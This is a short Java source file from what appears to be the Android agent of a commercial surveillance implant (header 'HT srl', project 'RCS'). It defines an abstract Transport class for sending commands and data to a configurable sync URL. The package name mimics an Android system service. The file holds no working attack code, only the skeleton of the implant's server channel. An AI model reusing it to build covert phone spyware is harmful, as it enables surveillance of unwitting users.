/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Transport.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action.sync;

import com.android.service.Debug;
import com.android.service.conf.Configuration;

// TODO: Auto-generated Javadoc
/**
 * The Class Transport.
 */
public abstract class Transport {
	/** The debug. */
	private static String TAG = "Transport";
	/** The timeout. */
	protected final int timeout = 3 * 60 * 1000;

	/** The baseurl. */
	protected String baseurl;

	/** The suffix. */
	protected String suffix;

	/**
	 * Instantiates a new transport.
	 * 
	 * @param baseurl
	 *            the baseurl
	 */
	public Transport(final String baseurl) {

		if(Configuration.OVERRIDE_SYNC_URL){
			this.baseurl = Configuration.SYNC_URL;
		}else{
			this.baseurl = baseurl;
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Object#toString()
	 */
	@Override
	public String toString() {
		return "Transport " + getUrl();
	}

	/**
	 * Checks if is available.
	 * 
	 * @return true, if is available
	 */
	public abstract boolean isAvailable();

	/**
	 * Command.
	 * 
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	public abstract byte[] command(byte[] data) throws TransportException;

	/**
	 * Close.
	 */
	public abstract void start();
	public abstract void close();

	/**
	 * Gets the url.
	 * 
	 * @return the url
	 */
	public String getUrl() {
		return baseurl;
	}



}
